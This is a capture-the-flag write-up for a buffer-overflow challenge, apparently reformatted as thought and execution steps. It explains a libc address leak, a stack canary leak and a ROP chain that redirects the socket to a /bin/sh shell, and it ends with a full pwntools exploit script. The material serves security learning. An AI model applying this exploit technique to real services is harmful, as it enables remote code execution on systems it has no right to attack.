@@ -1,0 +1,54 @@
+[
+    {
+        "type": "thought",
+        "content": "This challenge provides an executable and a libc.so file.\n\nRunning this file causes a segfault, so lets look at it in radare2"
+    },
+    {
+        "type": "execution",
+        "content": "r2 -A tutorial"
+    },
+    {
+        "type": "thought",
+        "content": "The file expects us to pass an argument designating the port number to listen on.\n\nrunning the program with argument 8000 will still have some errors: to get it working fully you have to fix the errors that it lists (making a user named tutorial, making a home directory for the user, etc)\n\nOnce this setup is done, we can run the program locally for testing. I could only get the program to run as root (probably not the safest thing to do, but I didn't feel like fixing the permission errors I was getting). running sudo ./tutorial 8001 in one terminal then nc 127.0.0.1 8001 in another terminal lets us connect to the service:"
+    },
+    {
+        "type": "execution",
+        "content": "./tutorial 8001"
+    },
+    {
+        "type": "thought",
+        "content": "There are 3 menu options:\n\nManual: this prints some address out, if this is a leak in libc, we can use this address and the given libc to get the address of anything in libc\n\nThis prompts you to enter your exploit, this is probably where we should look for a vulnerability\n\nQuit: quits the program\n\nAt this point, I decided to look at the 'menu' function from the binary in radare2:"
+    },
+    {
+        "type": "execution",
+        "content": "s sym.menu"
+    },
+    {
+        "type": "thought",
+        "content": "Here we can see that the function gets the address of the symbol \"puts\" in the current process, and prints this address - 1280.\n\nSince we now know the address of puts in memory, we can get around ASLR to find the address of anything in libc: address of thing in process = leaked address + 1280 - offset of puts + offset of thing we're finding in libc\n\nTo find offsets of a symbol in libc, you can open the given libc file in ida; its address in ida is its offset. Now lets look at func2This function has a clear buffer overflow: it reads 0x1cc bytes of input into a buffer at [bp - 140h]\n\nThe only thing in the way of a buffer overflow exploit is the stack canary. Looking at the disassembly shows us that the stack canary is found at ebp - 8 In order to succesfully exploit the system, we need to find the stack canary's value and include it at the right place in our exploit so that it is not modified by our buffer overflow\n\nLuckily for us, the stack canary is printed by the write() call at the end of the function. (It outputs 0x144 bytes starting at bp - 0x140, the canary is found at bp - 8)\n\nSo we can simply enter nothing as input to func 2, read the stack canary from the output, and then call func2 again with our real exploit.\n\nThe Exploit: In order to exploit this vulnerability, we will need to use ROP. We can get the address of system() using the leaked memory address and offsets from libc-2.19.so We can also get the address of the string \"/bin/sh\" found libc-2.19.so. If we can load \"/bin/sh\" into rdi, then return to system(), we can get a shell on the server.\n\nThe easiest way to get \"/bin/sh\" into rdi is to include its address into our input, then pop it into rdi using a rop gadget. To find gadgets for this exploit,"
+    },
+    {
+        "type": "execution",
+        "content": "/R pop rdi"
+    },
+    {
+        "type": "thought",
+        "content": "If we overwrite the return address (rbp + 8) with the address of this gadget, put the address of \"/bin/sh\" in rbp + 16, and put the address of system into rbp + 24, func2 will return to the gadget, pop \"/bin/sh\" into rdi, then return into system, executing /bin/sh.\n\nThe exploit now looks like this: \"A\" * (0x140 - 8) + stack canary + [8 bytes of filler] + pop_rdi_ret_gadget + bin_sh + system\n\nWriting up this exploit spawns a shell from the service, but we can't interact with it. This is because system connects the input and output of /bin/sh to file descriptors 0 and 1 respectively, of the parent process. Since we are passing input and output through a different file descriptor (for the socket being used), we can't interact with the shell we launched.\n\nIn order to interact with the shell we create, we need to replace file descriptors 0 and 1 with the descriptor for the socket we're communicating through.\n\nTo do this, we must call close(0) and close(1) to close the file descriptors for stdin and stdout We can then call dup(socket fd) twice to create file descriptors 0 and 1 that use our socket.\n\nWe can get the address of close and dup the same way we got the addresses of the other libc functions.\n\nTo find the socket being used, I launched the program in gdb, then looked at its open file descriptors in /proc/<pid>/fd/"
+    },
+    {
+        "type": "execution",
+        "content": "gdb tutorial"
+    },
+    {
+        "type": "thought",
+        "content": "To do this, simply set a breakpoint anywhere after the socket is created, and look at its file descriptors.\n\nWe can see from /proc/<pid>/fd that the socket has file descriptor 4.\n\nNow our exploit looks like this:\n\n(0x140 - 8) bytes of filler + stack_canary + 8 bytes of filler + pop_rdi_ret gadget + 0 + address of close + pop_rdi_ret gadget + 1 + address of close + pop_rdi_ret gadget + socket_fd number + address of dup + address of dup + pop_rdi_ret address + bin_sh address + system address\n\nThis will bypass the stack canary, call close(0), call close(1), call dup(4) twice, then call system(\"/bin/sh\")\n\nAn example of the final exploit can be found in tutorial.py"
+    },
+    {
+        "type": "execution",
+        "content": "#!/usr/bin/env python\n\nfrom pwn import *\n\n#for switching between local use and remote use\n\nlibcname = 'libc-2.19.so' #the libc that was given\n#libcname = 'libc-2.23.so'  #my libc for testing\n\n\nif libcname == 'libc-2.19.so':\n    r = remote('pwn.chal.csaw.io', 8002)\n    libc = ELF(libcname)\n    #get offsets of various symbols in libc-2.19.so\n    libc_puts_addr = libc.symbols['puts']\n    libc_system_addr = libc.symbols['system']\n    libc_bin_sh = next(libc.search('/bin/sh\\x00'))\n    libc_close = libc.symbols['close']\n    libc_fcntl = libc.symbols['fcntl']\n    libc_dup = libc.symbols['dup']\n\nelse:\n    r = remote('127.0.0.1', 8003)\n    #pwntools wouldnt handle my libc for some reason, so i just manually got the addresses from ida\n    libc_puts_addr = 0x6F5D0\n    libc_system_addr = 0x45380\n    libc_bin_sh = 0x18C58B\n    libc_close = 0xF7030\n    libc_fcntl = 0xF6DF0\n    libc_dup = 0x0F7090\n\n#use the 'manual' option in the menu\nr.sendline('1')\n\nmsg = r.recvline()\n\nwhile 'Reference' not in msg:\n    msg = r.recvline()\n\n#get address of puts - 1280\nleaked_addr = int(msg[msg.index(':') + 1: msg.index('\\n')], 16)\n#calculate the base of libc in the process from leaked address\nlibc_base = leaked_addr + 1280 - libc_puts_addr\n\n#calculate locations of symbols in the process form libc base and offset\nreal_sys_addr = libc_base + libc_system_addr\nreal_close_addr = libc_base + libc_close\nreal_dup_addr = libc_base + libc_dup\nbin_sh_addr = libc_base + libc_bin_sh\n\n#address of the pop rdi; ret gadget\npop_rdi_ret = 0x004012e3\n\n#call func2 with no input, to leak the stack canary\nfinalstr = \"2\\n\"\nr.sendline(finalstr)\n\n#print some of the responses for debugging purposes\nresponse = r.recv()\nprint(response)\nresponse = r.recv()\nprint(response)\nresponse = r.recv()\nprint(response)\n\n#get the contents of the stack canary from the output\nstack_canary = response[response.index('-Tut') - 12:response.index('-Tut')-4]\nprint(stack_canary)\n\n#pack the stack canary for use in the exploit\nstack_canary = u64(stack_canary)\n\n#incomplete exploit, does not replace stdin and stdout\n#finalstr = \"2\\n\" + \"A\" * (0x140 - 8) + p64(stack_canary) + \"AAAAAAAA\" + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(real_sys_addr)\n\n#full exploit, as described in README.md\nfinalstr = \"2\\n\" + \"A\" * (0x140 - 8) + p64(stack_canary) + \"AAAAAAAA\" + p64(pop_rdi_ret) + p64(0) + p64(real_close_addr) + p64(pop_rdi_ret) + p64(1) + p64(real_close_addr) + p64(pop_rdi_ret) + p64(4) + p64(real_dup_addr) + p64(real_dup_addr) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(real_sys_addr)\nprint finalstr\n\n#send the exploit\nr.sendline(finalstr)\n\n#switch to interactive shell\nr.interactive()"
+    },
+    {
+        "type": "thought",
+        "content": ""
+    }
+]
